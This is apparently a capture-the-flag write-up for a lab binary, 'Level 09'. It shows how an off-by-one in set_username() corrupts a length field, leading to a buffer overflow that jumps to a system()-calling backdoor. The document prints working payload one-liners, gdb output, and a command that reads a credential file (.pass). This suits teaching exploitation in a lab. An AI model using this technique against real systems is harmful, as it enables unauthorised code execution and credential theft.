# Level 09

## The Goal

- We have an executable asking for a name and a message who will be sent we don't know where.

```console
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 42
>: Welcome, 42
>: Msg @Unix-Dude
>>: reef > free
>: Msg sent!
```

- By reading the source code, we can see a very useful function: `secret_backdoor()` which calls the system function by passing it the standart input as an argument.

```c
int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}

```

- The `secret_backdoor` address can be fond as follows:

```gdb
(gdb) r <<< $(python -c 'print("A" * 40 + "\xca")')
Starting program: /home/users/level09/level09 <<< $(python -c 'print("A" * 40 + "\xca" * 146)')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Program received signal SIGSEGV, Segmentation fault.
0x0000555555550000 in ?? ()
(gdb) disass secret_backdoor
Dump of assembler code for function secret_backdoor:
	0x000055555555488c <+0>:	push   %rbp
	...
```

- The address of our function is 0x000055555555488c.
- We also see that the program crashes at the address 0x0000555555550000.
- There's only a 2-byte difference between the two, so we can replace just that!
- Now, we have to have to find a way to call this function.
- Looking a little deeper into the source code, we see that the message and its length are located in a structure.
- If we want to create an overflow, the length of the message must exceed the length of the array (140 char).
- Hopefully, there's a way to overflow memory in the `set_username()` function.
- A loop at the end of the function is supposed to store the first 40 characters retrieved by `fgets()` in the `name` part of the structure, which is an array of 40 char.
- But, what a pity, the condition is badly done! It says `i <= 40` instead of `i < 40`, so the function will store one extra byte in the structure, overridding one byte of the length parameter.
- We can then provoke our first segfault, and use this to inject the call to our backdoor:

```console
$ (python -c 'print("A" * 40 + "\xca")') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

### The Hack

```console
$ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
```
